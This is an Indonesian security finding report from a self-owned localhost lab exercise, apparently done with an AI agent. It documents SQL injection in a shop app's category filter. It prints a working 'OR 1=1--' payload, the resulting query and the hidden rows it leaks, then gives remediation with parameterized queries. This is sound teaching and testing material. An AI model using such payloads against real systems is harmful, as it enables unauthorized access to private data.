# LAPORAN TEMUAN KEAMANAN — SQL Injection (Lab Edukasi)

**Judul**        : SQL Injection pada filter kategori — membocorkan produk tersembunyi
**Target**       : Aplikasi toko latihan (`sqli_app.py`) — localhost:8010, milik sendiri
**Severity**     : 🔴 HIGH
**Status**       : Terkonfirmasi (PoC tersertifikasi)
**Tanggal**      : 3 Oktober 2026
**Penguji**      : Aldi + Hermes Agent (latihan terpandu)
**Status lab**   : ✅ SELESAI — terinspirasi lab PortSwigger "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data" (Apprentice)

---

## 1. Ringkasan Eksekutif

Parameter `kategori` pada endpoint `/filter` digabungkan langsung (string
concatenation) ke dalam query SQL tanpa sanitasi. Penyerang dapat menyuntik
karakter kutip + logika `OR 1=1` untuk mematikan filter `released = 1`,
sehingga seluruh produk **termasuk yang dirahasiakan / belum dirilis**
ikut ditampilkan.

## 2. Affected Component

- Endpoint : `GET /filter?kategori=<input>`
- File     : `sqli_app.py` → fungsi `query_products()`
- Query rentan:

```sql
SELECT * FROM products WHERE kategori = '<INPUT_USER>' AND released = 1
```

## 3. Bukti Konsep (PoC)

**Request:**
```
GET /filter?kategori=Gifts' OR 1=1-- HTTP/1.1
Host: 127.0.0.1:8010
```
(URL-encoded: `Gifts%27%20OR%201=1--`)

**Query yang terbentuk di server:**
```sql
SELECT * FROM products WHERE kategori = 'Gifts' OR 1=1--' AND released = 1
```
(`--` mengomentari sisa query → kondisi `released = 1` dimatikan)

**Hasil:** response berisi **9 produk** — termasuk 3 produk tersembunyi:
- id 7: "Voucher Tak Terbatas (RAHASIA)"
- id 8: "Prototipe Hoodie Dev"
- id 9: `Flag{sql_injection_pemula}` ← bukti penembusan

Perbandingan:
| Kondisi | Jumlah produk tampil |
|---|---|
| Normal (`kategori=Gifts`) | 2 |
| Setelah SQLi (`Gifts' OR 1=1--`) | 9 (semua, termasuk rahasia) |

## 4. Dampak (Impact)

- Data yang seharusnya rahasia (belum rilis / internal) bisa diambil siapa saja
  tanpa autentikasi.
- Pada aplikasi nyata, pola yang sama bisa digunakan untuk membaca tabel lain
  (users, password hash, data kartu) atau mengubah/menghapus data.

## 5. Rekomendasi Perbaikan (Remediation)

1. **Parameterized query** (prepared statement) — JANGAN rangkai string:
   ```python
   cur.execute("SELECT * FROM products WHERE kategori = ? AND released = 1",
               (kategori,))
   ```
2. Validasi input: whitelist kategori yang diizinkan.
3. Prinsip minimal-privilege: akun database aplikasi tidak butuh akses
   tulis kalau hanya membaca.

## Referensi
- PortSwigger Web Security Academy — SQL injection
- OWASP Top 10 (2021) — A03:2021 Injection

---
*Dokumen edukasi internal — lab berjalan di localhost, tidak ada sistem pihak
ketiga yang disentuh.*
